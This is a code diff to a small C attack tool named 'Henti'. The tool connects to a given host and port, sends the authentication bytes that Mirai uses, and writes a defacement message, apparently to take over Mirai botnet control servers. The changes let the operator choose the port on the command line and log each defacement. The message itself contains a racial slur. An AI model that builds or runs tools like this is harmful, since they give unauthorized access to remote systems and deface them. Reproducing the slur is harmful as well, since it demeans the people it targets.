@@ -39,7 +39,7 @@ void deface(char *Host, int Port)
     struct sockaddr_in servaddr, cli;
 
     char AuthBytes[] = {0x00, 0x00, 0x00, 0x01}; // Auth Bytes Mirai Uses
-    char Message[] = "[2J[0;0H[95mHenti Defaced Yo Net!!!\r\n\r\n\r\nLearn How To Code\r\nStupid Nigger >:C\r\n";// Edit Message Here!!!
+    char Message[] = "Henti Defaced Yo Net!!!\r\n\r\n\r\nLearn How To Code\r\nStupid Nigger >:C\r\n";// Edit Message Here!!!
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -71,7 +71,7 @@ void deface(char *Host, int Port)
     write(sockfd, Message, sizeof(Message));
 
 
-    puts("[:Henti] Wrote Message!");
+    printf("[:Henti] Sent Deface To [%s:%d] Message (%s)",Host,Port,Message);
 
     sleep(350);
 
@@ -89,8 +89,6 @@ int main(int argc, char *argv[])
     printf("\\    Y    /\\  ___/|   |  \\  | |  |\r\n");
     printf(" \\___|_  /  \\___  >___|  /__| |__|\r\n");
     printf("       \\/       \\/     \\/         \r\n");
-    
-    fflush(stdout);
 
     if (argc == 3)
     {
@@ -99,7 +97,7 @@ int main(int argc, char *argv[])
             puts("[:Henti] Please Check Your Host Ip\n");
             exit(0);
         }
-        else if ((Port = atoi("8080")) != 0)
+        else if ((Port = atoi(argv[2])) != 0)
         {
 
             deface(argv[1], Port);
